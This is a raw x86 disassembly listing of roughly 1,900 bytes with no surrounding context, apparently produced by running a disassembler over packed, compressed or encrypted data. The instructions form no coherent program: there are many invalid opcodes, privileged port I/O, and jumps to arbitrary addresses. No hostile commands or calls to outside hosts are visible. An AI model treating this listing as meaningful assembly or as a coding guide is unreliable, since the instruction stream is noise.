  41fda6:	cmp    al,0x10
  41fda8:	les    ecx,FWORD PTR [edx]
  41fdaa:	sub    BYTE PTR [ebp+0x33],ah
  41fdad:	push   0x4c2badf9
  41fdb2:	ins    DWORD PTR es:[edi],dx
  41fdb3:	mov    ah,0x7a
  41fdb5:	mov    cl,0x99
  41fdb7:	test   BYTE PTR [eax-0x76e72101],ah
  41fdbd:	(bad)  
  41fdbe:	fnstcw WORD PTR [edx-0x35aeec5e]
  41fdc4:	jp     0x41fdce
  41fdc6:	data16 out dx,al
  41fdc8:	pop    ss
  41fdc9:	stc    
  41fdca:	lods   al,BYTE PTR ds:[esi]
  41fdcb:	mov    dl,0x40
  41fdcd:	test   al,0xb7
  41fdcf:	inc    ebp
  41fdd0:	cmp    esi,DWORD PTR [eax]
  41fdd2:	loop   0x41fd85
  41fdd4:	sbb    ah,BYTE PTR [eax-0x71]
  41fdd7:	fist   WORD PTR [ecx+eax*8+0x41f5ec17]
  41fdde:	pop    es
  41fddf:	jno    0x41fdf4
  41fde1:	sub    bh,BYTE PTR [esi-0x6c]
  41fde4:	popa   
  41fde5:	adc    al,0x3e
  41fde7:	iret   
  41fde8:	pop    edi
  41fde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdea:	jl     0x41fe34
  41fdec:	arpl   WORD PTR [esi+0x6f],bp
  41fdef:	(bad)  
  41fdf1:	mov    ah,0xe2
  41fdf3:	ja     0x41fda9
  41fdf5:	dec    edi
  41fdf6:	(bad)  
  41fdf7:	in     eax,dx
  41fdf8:	xor    BYTE PTR [eax-0x5a185c7d],cl
  41fdfe:	aam    0x9a
  41fe00:	call   0x28995eef
  41fe05:	bnd jae 0x41fda0
  41fe08:	xchg   ebx,eax
  41fe09:	jp     0x41fe19
  41fe0b:	mov    ebp,0xaa7aa07f
  41fe10:	pop    esi
  41fe11:	pop    ss
  41fe12:	adc    BYTE PTR [ebp-0xa3a1429],al
  41fe18:	xchg   ebx,eax
  41fe19:	dec    edx
  41fe1a:	xchg   edx,eax
  41fe1b:	xchg   esi,eax
  41fe1c:	xchg   edx,eax
  41fe1d:	ja     0x41fdba
  41fe1f:	pop    ebp
  41fe20:	mov    cl,0xc7
  41fe22:	jg     0x41fdf0
  41fe24:	out    dx,al
  41fe25:	mov    al,ds:0x67e094fc
  41fe2a:	lods   eax,DWORD PTR ds:[si]
  41fe2c:	enter  0x4d43,0xce
  41fe30:	pop    ds
  41fe31:	nop
  41fe32:	scas   al,BYTE PTR es:[edi]
  41fe33:	(bad)  
  41fe34:	cmp    DWORD PTR [edi-0x5d27d101],ebx
  41fe3a:	dec    edx
  41fe3b:	jno    0x41fea9
  41fe3d:	dec    esi
  41fe3e:	mov    BYTE PTR [ebx+0x75],0x29
  41fe42:	les    edi,FWORD PTR [eax]
  41fe44:	xchg   ebp,eax
  41fe45:	jecxz  0x41fe4c
  41fe47:	scas   al,BYTE PTR es:[edi]
  41fe48:	push   eax
  41fe49:	in     eax,0x65
  41fe4b:	repz in al,dx
  41fe4d:	into   
  41fe4e:	mul    BYTE PTR [ebx+0xc881c12]
  41fe54:	mov    fs,esi
  41fe56:	mov    BYTE PTR [edx-0x51390101],cl
  41fe5c:	push   ebp
  41fe5d:	sbb    eax,esi
  41fe5f:	int3   
  41fe60:	sbb    ebx,ebx
  41fe62:	xor    DWORD PTR [edx-0x294785c1],esp
  41fe68:	or     edi,DWORD PTR [ecx+edi*8+0x34eeac99]
  41fe6f:	stos   DWORD PTR es:[edi],eax
  41fe70:	jnp    0x41fe44
  41fe72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe73:	data16 mov dh,0x47
  41fe76:	icebp  
  41fe77:	lods   al,BYTE PTR ds:[esi]
  41fe78:	call   FWORD PTR [edi+0x4e9c85cc]
  41fe7e:	jae    0x41fee3
  41fe80:	or     al,0xd4
  41fe83:	pop    edi
  41fe84:	lds    edx,FWORD PTR [ebx+esi*4]
  41fe87:	jae    0x41fe0e
  41fe89:	inc    ecx
  41fe8a:	xchg   DWORD PTR [ecx+0x5b],ebx
  41fe8d:	fwait
  41fe8e:	fs mov gs,ebp
  41fe91:	dec    eax
  41fe92:	or     eax,0x7efd7e0f
  41fe97:	sbb    cl,BYTE PTR [edx]
  41fe99:	or     eax,0xe905cb0d
  41fe9e:	addr16 inc edi
  41fea0:	inc    esi
  41fea1:	out    0x13,al
  41fea3:	outs   dx,DWORD PTR ds:[esi]
  41fea4:	sahf   
  41fea5:	mov    ebx,0x88430884
  41feaa:	outs   dx,BYTE PTR ds:[esi]
  41feab:	and    ch,bl
  41fead:	mov    WORD PTR [ebx],cs
  41feaf:	sbb    dl,BYTE PTR [ebp+0x75]
  41feb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feb3:	ins    DWORD PTR es:[edi],dx
  41feb4:	sub    eax,0x4d4e0355
  41feb9:	or     DWORD PTR [esi],ecx
  41febb:	inc    ebx
  41febc:	adc    BYTE PTR [ebp-0x5d],ah
  41febf:	sbb    edi,DWORD PTR [esi+0x430bd7e9]
  41fec5:	rcr    al,1
  41fec7:	add    ebx,ebx
  41fec9:	adc    DWORD PTR [ecx],eax
  41fecb:	or     eax,0x39047a11
  41fed0:	sbb    ch,BYTE PTR [ebp-0x75]
  41fed3:	add    al,0xbe
  41fed5:	iret   
  41fed6:	pop    esp
  41fed7:	ret    
  41fed8:	add    ecx,DWORD PTR [edx+0x69]
  41fedb:	pushf  
  41fedc:	xor    ebx,DWORD PTR [ebx+0x27]
  41fedf:	jns    0x41ff37
  41fee1:	int    0xab
  41fee3:	jns    0x41ff48
  41fee5:	test   DWORD PTR [edx+0x2e],ebp
  41fee8:	out    dx,eax
  41fee9:	dec    bp
  41feeb:	pop    ss
  41feec:	ret    
  41feed:	xor    BYTE PTR [esi+eiz*4],dh
  41fef0:	pop    es
  41fef1:	stos   BYTE PTR es:[edi],al
  41fef2:	fcmovnu st,st(7)
  41fef4:	cmp    edx,DWORD PTR [ecx+ebx*1-0x33]
  41fef8:	mov    ds,WORD PTR [eax+0x7]
  41fefb:	jns    0x41feed
  41fefd:	stos   BYTE PTR es:[edi],al
  41fefe:	lea    esp,[edx-0x10e82925]
  41ff04:	adc    BYTE PTR [edi+0x64],dl
  41ff07:	dec    ebx
  41ff08:	icebp  
  41ff09:	bound  esi,QWORD PTR [edx+ebx*2+0x1f]
  41ff0d:	sbb    dh,0xe3
  41ff10:	cdq    
  41ff11:	xor    edx,DWORD PTR [eax]
  41ff13:	sub    BYTE PTR [ecx],al
  41ff15:	lods   eax,DWORD PTR ds:[esi]
  41ff16:	pop    esp
  41ff17:	(bad)  
  41ff19:	mov    DWORD PTR [edx+0x7c9b9197],esi
  41ff1f:	cmp    BYTE PTR [eax],cl
  41ff21:	pop    ebx
  41ff22:	push   esp
  41ff23:	dec    edi
  41ff24:	outs   dx,BYTE PTR ds:[esi]
  41ff25:	outs   dx,BYTE PTR ds:[esi]
  41ff26:	and    DWORD PTR [eax],esi
  41ff28:	adc    BYTE PTR [edi+0x6c5eb1ad],dl
  41ff2e:	cwde   
  41ff2f:	xor    al,0x51
  41ff31:	fild   DWORD PTR [edx]
  41ff33:	imul   ecx,DWORD PTR [esi+0x2c4f9df8],0xcbcdd479
  41ff3d:	(bad)  
  41ff3e:	jbe    0x41fecd
  41ff40:	test   ah,bl
  41ff42:	mov    ah,0x75
  41ff44:	push   esi
  41ff45:	retf   0x62b4
  41ff48:	jmp    0xcfd363cf
  41ff4d:	cmp    esp,edx
  41ff4f:	fsubr  st,st(1)
  41ff51:	sub    DWORD PTR ds:0x69f28b47,ebx
  41ff57:	fstp   TBYTE PTR [ebx+0x3fc2c7db]
  41ff5d:	aad    0xcb
  41ff5f:	sbb    edi,DWORD PTR [esi+0x54b8f83]
  41ff65:	ret    
  41ff66:	fnstenv [ebx+0x3a7b1832]
  41ff6c:	mov    ebp,0x5a87babc
  41ff71:	sbb    DWORD PTR [edx+0x2f],edi
  41ff74:	dec    edi
  41ff75:	sahf   
  41ff76:	enter  0xef5b,0xe7
  41ff7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff7b:	adc    ebx,DWORD PTR [esi+edx*4-0x677377b6]
  41ff82:	push   esp
  41ff83:	retf   
  41ff84:	dec    eax
  41ff85:	daa    
  41ff86:	gs cwde 
  41ff88:	popa   
  41ff89:	mov    esp,0x1ee32c36
  41ff8e:	ss pusha 
  41ff90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff91:	jecxz  0x41ff3c
  41ff93:	push   es
  41ff94:	in     eax,0x7
  41ff96:	ret    0xf03
  41ff99:	xchg   DWORD PTR [edi],edi
  41ff9b:	mov    ds:0x387a2979,al
  41ffa0:	mov    esp,0x89564b81
  41ffa5:	jae    0x41ff6f
  41ffa7:	retf   0x8a6
  41ffaa:	xchg   DWORD PTR [ecx+0x4fa32296],esi
  41ffb0:	sub    ah,BYTE PTR [ebp-0x36]
  41ffb3:	in     eax,0x5b
  41ffb5:	sbb    al,0xf0
  41ffb7:	das    
  41ffb8:	push   eax
  41ffb9:	out    dx,eax
  41ffba:	outs   dx,DWORD PTR ds:[esi]
  41ffbb:	jecxz  0x41ffd0
  41ffbd:	inc    ebx
  41ffbe:	jmp    0x41ffb6
  41ffc0:	inc    esi
  41ffc1:	loop   0x420008
  41ffc3:	hlt    
  41ffc4:	in     eax,dx
  41ffc5:	fdivp  st(1),st
  41ffc7:	dec    edx
  41ffc8:	mov    al,ds:0xab142de
  41ffcd:	cmp    BYTE PTR [esi+0x4b],bl
  41ffd0:	mov    ch,0xe7
  41ffd2:	mov    bl,0x67
  41ffd4:	and    BYTE PTR [ecx+0x5003b6bb],cl
  41ffda:	stc    
  41ffdb:	ret    
  41ffdc:	ret    0x4e90
  41ffdf:	sbb    esp,ecx
  41ffe1:	xchg   ebp,eax
  41ffe2:	sub    ax,0xfdeb
  41ffe6:	cs dec ebx
  41ffe8:	dec    edx
  41ffe9:	push   0x7a
  41ffeb:	icebp  
  41ffec:	cwde   
  41ffed:	mov    esi,0x3f0f8f30
  41fff2:	jp     0x41ffd8
  41fff4:	pushf  
  41fff5:	imul   edi,DWORD PTR [edi-0x2e],0xb4acc917
  41fffc:	add    BYTE PTR [eax-0x37bf4e93],bh
  420002:	outs   dx,DWORD PTR ds:[esi]
  420003:	add    eax,0xdcdced90
  420008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420009:	into   
  42000a:	jmp    0xb1cea5cf
  42000f:	sbb    ch,BYTE PTR [eax+0x7c]
  420012:	push   edx
  420013:	or     DWORD PTR ds:0x9c98c80,0x61
  42001a:	inc    edi
  42001b:	fcomp  QWORD PTR [ebx-0x6e]
  42001e:	jg     0x41ffc7
  420020:	adc    al,0xd
  420022:	stos   DWORD PTR es:[edi],eax
  420023:	in     al,dx
  420024:	mov    dh,0x75
  420026:	bound  esp,QWORD PTR [edx]
  420028:	inc    ebp
  420029:	push   0x41e48139
  42002e:	out    0xb9,al
  420030:	mov    ds:0xdea557a8,eax
  420035:	stc    
  420036:	mov    ds:0xb5c56882,al
  42003b:	mov    BYTE PTR [edi+0x5d],dh
  42003e:	in     al,dx
  42003f:	pop    ss
  420040:	pop    ds
  420041:	sti    
  420042:	ins    DWORD PTR es:[edi],dx
  420043:	xor    eax,0x306ae4af
  420048:	cmp    eax,0x9f73477f
  42004d:	mov    eax,0xf2883901
  420052:	je     0x41ffd9
  420054:	and    esi,DWORD PTR [eax]
  420056:	and    eax,0x3461d518
  42005b:	or     al,0xf0
  42005d:	imul   esi,DWORD PTR [ebx+0x5820b2f6],0xffffffca
  420064:	xor    eax,0x70d4bd3d
  420069:	adc    BYTE PTR [ecx-0x3019ce83],0xd3
  420070:	cdq    
  420071:	out    0x74,al
  420073:	fnstcw WORD PTR [ecx]
  420075:	(bad)  
  420076:	shl    DWORD PTR [edi+0x75ad7420],1
  42007c:	in     eax,0x9e
  42007e:	fsubp  st(3),st
  420080:	jl     0x4200e4
  420082:	xor    eax,0xfd5fc975
  420087:	pop    eax
  420088:	adc    ebx,0x12f865fc
  42008e:	div    DWORD PTR [edi]
  420090:	ret    
  420091:	lods   eax,DWORD PTR ds:[esi]
  420092:	cli    
  420093:	fst    QWORD PTR [ebx]
  420095:	retf   0x63a9
  420098:	repnz cdq 
  42009a:	(bad)  
  42009b:	adc    eax,0xdaa9b54a
  4200a0:	mov    edi,0x54362e0c
  4200a5:	retf   
  4200a6:	mov    ecx,0xd9787849
  4200ab:	outs   dx,BYTE PTR ds:[esi]
  4200ac:	clc    
  4200ad:	jmp    0xd6dfa494
  4200b2:	lea    edi,[esi-0x1c]
  4200b5:	jg     0x4200e7
  4200b7:	test   DWORD PTR ds:0x337094e,eax
  4200bd:	stc    
  4200be:	ja     0x420094
  4200c0:	out    0x12,eax
  4200c2:	out    0x5f,eax
  4200c4:	inc    edx
  4200c5:	rol    BYTE PTR [edx+0x49],1
  4200c8:	aad    0xba
  4200ca:	xor    DWORD PTR [ebx+0x3],0x77
  4200ce:	lods   eax,DWORD PTR ds:[esi]
  4200cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d0:	retf   0x694e
  4200d3:	pop    esp
  4200d4:	in     eax,0xf
  4200d6:	daa    
  4200d7:	ror    DWORD PTR [ebp+edx*1-0x5a],1
  4200db:	bnd jo 0x42013f
  4200de:	xchg   ebx,eax
  4200df:	test   DWORD PTR [edx+0x51dcd4a1],ebp
  4200e5:	mov    ecx,0xf9e33041
  4200ea:	push   esp
  4200eb:	cmp    eax,0x4d4e775
  4200f0:	cs mov edi,0x5413db88
  4200f6:	pop    esi
  4200f7:	mov    ebp,0xde261ef4
  4200fc:	(bad)  [esi]
  4200fe:	int    0x41
  420100:	and    ecx,DWORD PTR [ebx+0x423e4054]
  420106:	push   ss
  420107:	push   0x24d82479
  42010c:	sub    ebx,ebp
  42010e:	mov    dh,0x82
  420110:	cmp    eax,0x6c66dd77
  420115:	add    ebx,esp
  420117:	xchg   edx,eax
  420118:	mov    BYTE PTR [ebx+edx*8],bl
  42011b:	mov    bl,bl
  42011d:	sbb    al,BYTE PTR [ebx]
  42011f:	add    eax,0xa9a64a34
  420124:	dec    edi
  420125:	adc    DWORD PTR [ecx-0x5c59e3aa],eax
  42012b:	pushf  
  42012c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42012d:	or     al,0x45
  42012f:	or     DWORD PTR [ecx],edx
  420131:	push   esi
  420132:	inc    ecx
  420133:	aam    0xa8
  420135:	sub    DWORD PTR [eax+edx*2-0x11d81b11],ebx
  42013c:	cmp    eax,0x1d9ab555
  420141:	outs   dx,BYTE PTR ds:[esi]
  420142:	mov    es:0xdc365621,eax
  420148:	sbb    esp,ebp
  42014a:	lods   al,BYTE PTR ds:[esi]
  42014b:	mov    bh,0x6
  42014d:	gs jns 0x420194
  420150:	cmp    eax,0xb537f412
  420155:	cmp    edi,DWORD PTR [esi]
  420157:	enter  0x4836,0xe1
  42015b:	mov    al,ds:0xdd8d9216
  420160:	dec    edx
  420161:	fcomp  DWORD PTR [edx]
  420163:	ja     0x42018e
  420165:	jl     0x420158
  420167:	jmp    0x42010c
  420169:	dec    esi
  42016a:	or     al,0x3a
  42016c:	xor    al,0xaa
  42016e:	mov    al,0x15
  420170:	sub    BYTE PTR [esi+0x72fc410a],bl
  420176:	pop    es
  420177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420178:	sub    eax,0xcb2c6538
  42017d:	sub    dh,BYTE PTR [ebx+0x3a8b7895]
  420183:	jecxz  0x420118
  420185:	dec    ebp
  420186:	mov    ds,WORD PTR [ebx]
  420188:	not    BYTE PTR [eax]
  42018a:	jmp    0x42011e
  42018c:	jne    0x4201e1
  42018e:	bound  eax,QWORD PTR [eax-0x38]
  420191:	scas   al,BYTE PTR es:[edi]
  420192:	pop    edi
  420193:	and    BYTE PTR [edi+0x6f007175],0xc5
  42019a:	repnz add DWORD PTR [edi+edi*8+0x3a0299cb],edx
  4201a2:	add    edi,DWORD PTR [eax+edi*8+0x15bba12f]
  4201a9:	sbb    eax,0x45f6d366
  4201ae:	jl     0x42019f
  4201b0:	or     eax,0xcacc6e10
  4201b5:	(bad)  
  4201b7:	cmp    bh,ah
  4201b9:	dec    ecx
  4201ba:	test   BYTE PTR [eax],dl
  4201bc:	fs mov al,bl
  4201bf:	loopne 0x420209
  4201c1:	or     BYTE PTR [eax],bh
  4201c3:	call   0x805:0x16f027d3
  4201ca:	xchg   edi,eax
  4201cb:	and    BYTE PTR [ebp-0x6f],al
  4201ce:	cwde   
  4201cf:	das    
  4201d0:	cdq    
  4201d1:	mov    ebx,0xa9404606
  4201d6:	fcom   DWORD PTR [eax-0x5d]
  4201d9:	sub    ecx,DWORD PTR [edi+0x72]
  4201dc:	cmp    al,0x3f
  4201de:	es jmp 0x9e4313f7
  4201e4:	cmp    edi,ebp
  4201e6:	or     esp,edi
  4201e8:	popf   
  4201e9:	fidiv  DWORD PTR [eax+0x6c3417cb]
  4201ef:	xchg   esi,eax
  4201f0:	adc    edi,DWORD PTR [eax-0x30c57821]
  4201f6:	leave  
  4201f7:	jns    0x42024e
  4201f9:	loopne 0x42024d
  4201fb:	sahf   
  4201fc:	bound  eax,QWORD PTR [esi-0x4871e0f6]
  420202:	repz repz jne 0x4201d1
  420206:	mov    ds:0x3c9f9f13,eax
  42020b:	and    DWORD PTR [ecx-0x49],eax
  42020e:	mov    ebp,0x631d7bb6
  420213:	add    DWORD PTR [edx-0x7],ecx
  420216:	adc    al,0x7a
  420218:	dec    esp
  420219:	(bad)  
  42021a:	out    0x41,eax
  42021c:	fldenv gs:[edi+0x4d]
  420220:	cld    
  420221:	jb     0x4201b2
  420223:	pop    esi
  420224:	das    
  420225:	ret    
  420226:	adc    bl,BYTE PTR [eax]
  420228:	inc    edi
  420229:	clc    
  42022a:	popf   
  42022b:	add    eax,0x59bf4541
  420230:	xor    DWORD PTR ds:[edi+0x7e593078],ecx
  420237:	sub    al,BYTE PTR [ebp-0x1]
  42023a:	cmp    edi,edx
  42023c:	rcl    DWORD PTR [ebx+ebp*4+0x36],cl
  420240:	jae    0x420265
  420242:	loopne 0x42029d
  420244:	mov    ebp,0x1b042424
  420249:	loopne 0x4202bf
  42024b:	ret    0xa06a
  42024e:	(bad)  
  420250:	add    ah,ch
  420252:	mov    edx,0x3aaf45d2
  420257:	out    0x88,al
  420259:	sbb    ch,BYTE PTR [esi+0x34]
  42025c:	jne    0x420218
  42025e:	adc    eax,0xdba01f83
  420263:	jbe    0x42028a
  420265:	inc    eax
  420266:	inc    edx
  420267:	fidivr WORD PTR [ecx]
  420269:	push   esi
  42026a:	push   edx
  42026b:	stc    
  42026c:	dec    ebp
  42026d:	mov    ds,WORD PTR [ebx+0x32]
  420270:	repnz mov ah,0xa8
  420273:	push   es
  420274:	ret    
  420275:	in     al,dx
  420276:	ret    0xe65
  420279:	shl    DWORD PTR [edi-0x2fc6f17e],0x9a
  420280:	add    al,0x4a
  420282:	mov    esp,0x1784f3cf
  420287:	test   al,0xb8
  420289:	cmp    eax,DWORD PTR [eax-0x4c]
  42028c:	xor    al,0x58
  42028e:	push   edi
  42028f:	inc    ebx
  420290:	retf   
  420291:	add    BYTE PTR [edi-0x15a0c986],ah
  420297:	dec    ecx
  420298:	out    0xd2,eax
  42029a:	dec    edi
  42029b:	jecxz  0x4202bd
  42029d:	pop    ds
  42029e:	popa   
  42029f:	(bad)  
  4202a0:	cli    
  4202a1:	jg     0x4202d8
  4202a3:	adc    esp,DWORD PTR [edi+0x1a]
  4202a6:	adc    al,0xb6
  4202a8:	icebp  
  4202a9:	idiv   DWORD PTR [ebx]
  4202ab:	inc    esp
  4202ac:	jg     0x420312
  4202ae:	gs out 0xe2,eax
  4202b1:	retf   0x8058
  4202b4:	stc    
  4202b5:	add    esi,DWORD PTR gs:[eax+0x618ef643]
  4202bc:	ficom  DWORD PTR [ebx-0x1a]
  4202bf:	ret    0xee82
  4202c2:	add    eax,0x2473eade
  4202c7:	push   esp
  4202c8:	cli    
  4202c9:	adc    DWORD PTR [edx-0x36691929],0x47f2651f
  4202d3:	data16 loopne 0x42034b
  4202d6:	loop   0x420340
  4202d8:	xchg   BYTE PTR [ecx-0x77ad818a],dl
  4202de:	jecxz  0x420322
  4202e0:	pop    esi
  4202e1:	jae    0x4202a2
  4202e3:	ret    
  4202e4:	aam    0x1c
  4202e6:	mov    cl,0xf2
  4202e8:	das    
  4202e9:	pop    esp
  4202ea:	fdiv   st(0),st
  4202ec:	inc    edx
  4202ed:	fistp  QWORD PTR [eax+0x73806ea0]
  4202f3:	jne    0x420286
  4202f5:	cmp    dh,BYTE PTR [edx+0x77f9a780]
  4202fb:	sub    al,0xc0
  4202fd:	push   0x1a
  4202ff:	cdq    
  420300:	sbb    dl,BYTE PTR [edi]
  420302:	pushf  
  420303:	gs inc ebx
  420305:	adc    al,0x6c
  420307:	mov    eax,ss:0xd40c13d0
  42030d:	cwde   
  42030e:	xchg   ecx,eax
  42030f:	div    BYTE PTR [eax+ebx*2-0x62a360f3]
  420316:	fadd   DWORD PTR ss:[esi-0x7b]
  42031a:	scas   al,BYTE PTR es:[edi]
  42031b:	mov    bl,0x5b
  42031d:	push   0xffffffa2
  42031f:	into   
  420320:	aaa    
  420321:	rcr    DWORD PTR [edi+0x4155c726],cl
  420327:	cmp    BYTE PTR [esi-0x41cc8f49],dl
  42032d:	cmc    
  42032e:	cwde   
  42032f:	add    BYTE PTR [esi+0x70922d6b],bl
  420335:	push   eax
  420336:	and    DWORD PTR [ebp-0x6f],0x2fcb8df6
  42033d:	cmc    
  42033e:	scas   eax,DWORD PTR es:[edi]
  42033f:	pop    eax
  420340:	mov    edx,0x4f8cd033
  420345:	shl    BYTE PTR ds:0xf70ebe2,0xed
  42034c:	rol    DWORD PTR gs:[edi],0xee
  420350:	dec    edi
  420351:	test   eax,0xf98b5f01
  420356:	ror    DWORD PTR [esi+esi*8],cl
  420359:	push   esp
  42035a:	xor    eax,0xbcbd6abe
  42035f:	lock push ebx
  420361:	fwait
  420362:	inc    ebx
  420363:	inc    edx
  420364:	iret   
  420365:	lods   eax,DWORD PTR ds:[esi]
  420366:	xor    edx,DWORD PTR ds:0x6f2c618a
  42036c:	leave  
  42036d:	enter  0xac12,0xc3
  420371:	cmp    dh,al
  420373:	sti    
  420374:	mov    ebx,0x10d002f1
  420379:	pop    esi
  42037a:	imul   edi,DWORD PTR [esi+edx*8+0xa90cf85],0x8a3bc6a0
  420385:	lods   eax,DWORD PTR ds:[esi]
  420386:	jl     0x4203c5
  420388:	jge    0x420365
  42038a:	lods   al,BYTE PTR ds:[esi]
  42038b:	icebp  
  42038c:	(bad)  
  42038d:	rcl    DWORD PTR [eax+0x31],0xd2
  420391:	test   BYTE PTR [ecx],dl
  420393:	enter  0x8630,0x85
  420397:	xchg   DWORD PTR [edi],ebx
  420399:	je     0x4203be
  42039b:	xor    edi,DWORD PTR [edi+eax*1-0x385bfa93]
  4203a2:	jmp    0x35ea:0x677622c6
  4203a9:	hlt    
  4203aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203ab:	dec    ebp
  4203ac:	hlt    
  4203ad:	mov    ch,0x14
  4203af:	imul   bl
  4203b1:	arpl   WORD PTR [ebp-0x1f466f80],di
  4203b7:	xor    edx,edi
  4203b9:	push   eax
  4203ba:	mov    ds:0xc3b9a1fa,al
  4203bf:	mov    dl,0x64
  4203c1:	ins    DWORD PTR es:[edi],dx
  4203c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203c3:	xchg   esi,eax
  4203c4:	push   eax
  4203c5:	jle    0x420434
  4203c7:	dec    ecx
  4203c8:	shr    BYTE PTR ds:0xe527c788,cl
  4203ce:	pop    esi
  4203cf:	out    dx,eax
  4203d0:	(bad)  
  4203d1:	mov    ebx,0xe833732d
  4203d6:	pop    edi
  4203d7:	lods   al,BYTE PTR ds:[esi]
  4203d8:	mov    al,0x7d
  4203da:	mov    cl,0x2e
  4203dc:	dec    edx
  4203dd:	or     DWORD PTR [eax-0x55c7b0dc],esi
  4203e3:	push   edi
  4203e4:	xor    bl,al
  4203e6:	dec    edi
  4203e7:	popf   
  4203e8:	mov    al,0xf3
  4203ea:	sub    al,0xb
  4203ec:	cld    
  4203ed:	imul   ebp,DWORD PTR ss:[ebx+0x4a],0xffffff86
  4203f2:	in     al,dx
  4203f3:	out    dx,eax
  4203f4:	jbe    0x42039f
  4203f6:	jns    0x4203b4
  4203f8:	pop    edx
  4203f9:	xchg   BYTE PTR [edi+0x6859de54],bl
  4203ff:	in     eax,0x6c
  420401:	push   esp
  420402:	jb     0x4203cf
  420404:	xchg   esi,eax
  420405:	aad    0x4f
  420407:	dec    ecx
  420408:	adc    DWORD PTR [edx+0x4485fc95],ebp
  42040e:	shl    DWORD PTR [edi-0x68b17281],cl
  420414:	lods   al,BYTE PTR ds:[esi]
  420415:	shl    DWORD PTR cs:[ebp+0x2237d995],cl
  42041c:	and    esi,DWORD PTR [eax+0x48]
  42041f:	mov    esi,0x2ea07596
  420424:	xor    dl,bl
  420426:	jp     0x4203ad
  420428:	inc    ecx
  420429:	push   ebx
  42042a:	push   edi
  42042b:	popf   
  42042c:	out    0xe4,eax
  42042e:	mov    al,BYTE PTR [edi]
  420430:	add    ah,dl
  420432:	jns    0x4203e5
  420434:	push   esp
  420435:	fisubr DWORD PTR gs:[edx]
  420438:	jbe    0x4203f6
  42043a:	mov    BYTE PTR [eax+0x4a35be13],0x6b
  420441:	sub    DWORD PTR [esp+edi*8-0x70ca0293],esp
  420448:	sahf   
  420449:	push   0xd7223b99
  42044e:	(bad)  
  42044f:	std    
  420450:	fistp  DWORD PTR [eax+0x5c]
  420453:	and    ch,bh
  420455:	loop   0x4204c0
  420457:	cdq    
  420458:	dec    esi
  420459:	jmp    0x8dc635c
  42045e:	inc    esp
  42045f:	call   0x7596f038
  420464:	pop    esi
  420465:	jbe    0x4203f1
  420467:	das    
  420468:	lods   al,BYTE PTR ds:[esi]
  420469:	and    esi,ecx
  42046b:	add    eax,DWORD PTR [edi]
  42046d:	aam    0x2f
  42046f:	mov    ds:0x3e1fed4f,eax
  420474:	and    DWORD PTR cs:[ebp+ebp*4-0xa],eax
  420479:	inc    eax
  42047a:	xchg   esp,eax
  42047b:	push   ecx
  42047c:	dec    BYTE PTR [esi-0x69]
  42047f:	(bad)  
  420480:	adc    BYTE PTR [ecx-0x38],dh
  420483:	lahf   
  420484:	das    
  420485:	xchg   esp,eax
  420486:	add    BYTE PTR [edx-0x4893f922],0x42
  42048d:	imul   DWORD PTR [ecx-0x17]
  420490:	lods   eax,DWORD PTR ss:[esi]
  420492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420493:	jmp    FWORD PTR [eax]
  420495:	mov    BYTE PTR [eax],0x9d
  420498:	fadd   st(2),st
  42049a:	es out 0x49,al
  42049d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42049e:	stc    
  42049f:	cmp    ebp,ecx
  4204a1:	aad    0x1b
  4204a3:	mov    BYTE PTR [eax-0x2c],ch
  4204a6:	fwait
  4204a7:	hlt    
  4204a8:	sub    al,0x2b
  4204aa:	jb     0x42045e
  4204ac:	mov    ah,0x35
  4204ae:	sub    al,0x47
  4204b0:	mov    WORD PTR [eax+0x74274661],gs
  4204b6:	mov    al,BYTE PTR [ebp+0x76]
  4204b9:	mov    DWORD PTR [eax-0x52a63fcf],edx
  4204bf:	and    ebx,DWORD PTR [edx]
  4204c1:	cld    
  4204c2:	dec    esp
  4204c3:	mov    esp,DWORD PTR [ecx]
  4204c5:	pop    ss
  4204c6:	loopne 0x42045a
  4204c8:	inc    DWORD PTR [esi]
  4204ca:	outs   dx,DWORD PTR ds:[esi]
  4204cb:	iret   
  4204cc:	jmp    0x42049d
  4204ce:	or     eax,0x8d23b5bf
  4204d3:	pusha  
  4204d4:	mov    al,0x2
  4204d6:	outs   dx,BYTE PTR ds:[esi]
  4204d7:	cmp    al,0x3c
  4204d9:	ss sbb al,0xb2
  4204dc:	rol    BYTE PTR [edx+0x4939c2f],1
  4204e2:	add    DWORD PTR [edx-0x7b0042df],esi
  4204e8:	or     dl,al
  4204ea:	pop    ds
  4204eb:	das    
  4204ec:	sbb    eax,0x17a9071f
  4204f1:	sub    BYTE PTR [edi+0x23],cl
  4204f4:	mov    al,0xb3
  4204f6:	cmp    BYTE PTR [ecx+0x51],dh
  4204f9:	cmp    BYTE PTR [edi],dl
  4204fb:	jl     0x4204f8
  4204fd:	inc    esp
  4204fe:	shl    cl,0xc5
  420501:	rol    DWORD PTR [edx-0xf2bba6d],1
  420507:	xlat   BYTE PTR ds:[ebx]
  420508:	aaa    
  420509:	or     ah,BYTE PTR [eax-0x46]
  42050c:	xchg   edx,eax
  42050d:	mov    es:0x3a083042,al
  420513:	jg     0x4204b0
  420515:	aas    
  420516:	in     eax,0x20
  420518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420519:	pop    es
  42051a:	mov    ch,dl
  42051c:	ror    BYTE PTR [ebp-0x3c087e09],0x84
  420523:	jmp    0xcbf45143
  420528:	je     0x420564
  42052a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42052b:	cmovle edi,DWORD PTR [edx+0x17]
  42052f:	lock ss (bad) 
  420532:	hlt    
  420533:	mov    eax,0x7939838f
  420538:	lods   al,BYTE PTR ds:[esi]
  420539:	in     eax,dx
  42053a:	jmp    0x420586
  42053c:	xor    dl,cl
  42053e:	stos   BYTE PTR es:[edi],al
  42053f:	ins    BYTE PTR es:[edi],dx
  420540:	js     0x4204dd
